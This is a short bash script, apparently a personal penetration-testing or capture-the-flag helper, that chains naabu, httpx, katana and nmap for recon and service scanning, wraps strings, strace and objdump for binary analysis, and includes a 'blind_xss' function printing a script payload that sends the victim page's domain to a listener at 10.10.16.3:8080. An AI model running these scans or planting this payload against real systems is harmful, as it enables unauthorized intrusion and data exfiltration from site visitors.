#!/bin/bash

hostname="$1"

echo $hostname | anew ip.txt

cat ip.txt domains.txt | naabu | anew naabu.txt | httpx | anew httpx.txt | katana | anew urls.txt

nmap -sC -sV $(cat ip.txt) > nmap.txt

#local file name
hack_executable(){
	strings $file > strings.txt
	strace ./$file > strace.txt
	objdump -d  ./$file > objdump.txt
}

blind_xss(){
	echo "<script>document.location='http://10.10.16.3:8080/g.php?c='+document.domain</script>"
}

#TODO fuff setup
#cat ffuf.json  | jq -r ".results[].url" | anew urls.txt
